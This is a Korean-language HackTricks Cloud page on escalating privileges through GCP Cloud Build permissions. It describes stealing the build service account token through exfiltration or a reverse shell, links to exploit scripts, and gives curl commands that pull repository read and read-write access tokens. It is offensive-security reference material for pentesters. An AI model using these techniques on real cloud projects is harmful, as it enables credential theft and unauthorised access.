# GCP - Cloudbuild Privesc

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 **HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 클라우드빌드

클라우드빌드에 대한 자세한 정보는 다음을 참조하세요:

{% content-ref url="../gcp-services/gcp-cloud-build-enum.md" %}
[gcp-cloud-build-enum.md](../gcp-services/gcp-cloud-build-enum.md)
{% endcontent-ref %}

### `cloudbuild.builds.create`

이 권한을 사용하면 **클라우드 빌드를 제출**할 수 있습니다. 클라우드빌드 머신에는 **기본적으로 cloudbuild 서비스 계정의 토큰**(`<PROJECT_NUMBER>@cloudbuild.gserviceaccount.com`)이 파일 시스템에 있습니다. 그러나 클라우드빌드 구성에서 프로젝트 내의 **임의의 서비스 계정을 지정**할 수도 있습니다.\
따라서 머신을 사용하여 토큰을 서버로 유출하거나 **머신 내에서 역쉘을 얻어 토큰을 스스로 가져올 수 있습니다**(토큰을 포함하는 파일은 변경될 수 있음).

원본 악용 스크립트는 [**GitHub에서 여기에서 찾을 수 있습니다**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudbuild.builds.create.py) (하지만 토큰을 가져오는 위치는 제대로 작동하지 않았습니다). 따라서 [**여기에서 취약한 환경의 생성, 악용 및 정리를 자동화하는 스크립트**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/f-cloudbuild.builds.create.sh)와 클라우드빌드 머신 내에서 역쉘을 얻고 [**여기에서 토큰을 훔치는 파이썬 스크립트**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/f-cloudbuild.builds.create.py)를 확인하세요(코드에서 다른 서비스 계정을 지정하는 방법을 찾을 수 있습니다)**.**

더 자세한 설명은 [https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/](https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/)를 방문하세요.

### `cloudbuild.builds.update`

이 권한을 가지면 **클라우드 빌드를 업데이트하고 이전 권한과 마찬가지로 서비스 계정 토큰을 훔칠 수 있을 수도 있습니다**(하지만 이 글을 작성하는 시점에서 해당 API를 호출하는 방법을 찾지 못했습니다).

TODO

### `cloudbuild.repositories.accessReadToken`

이 권한을 가지면 사용자는 저장소에 액세스하는 데 사용되는 **읽기 액세스 토큰**을 얻을 수 있습니다:

{% code overflow="wrap" %}
```
```
{% endcode %}

```bash
curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
-d '{}' \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadToken"
```

### `cloudbuild.repositories.accessReadWriteToken`

이 권한을 가지고 있는 사용자는 저장소에 액세스하는 데 사용되는 **읽기 및 쓰기 액세스 토큰**을 얻을 수 있습니다:

{% code overflow="wrap" %}
```
```
{% endcode %}

```bash
curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
-d '{}' \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadWriteToken"
```

### `cloudbuild.connections.fetchLinkableRepositories`

이 권한을 사용하면 **연결에 액세스 할 수 있는 저장소를 가져올 수 있습니다:**

{% code overflow="wrap" %}
```bash
curl -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>:fetchLinkableRepositories"
```
{% endcode %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 AWS 해킹을 전문가 수준으로 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
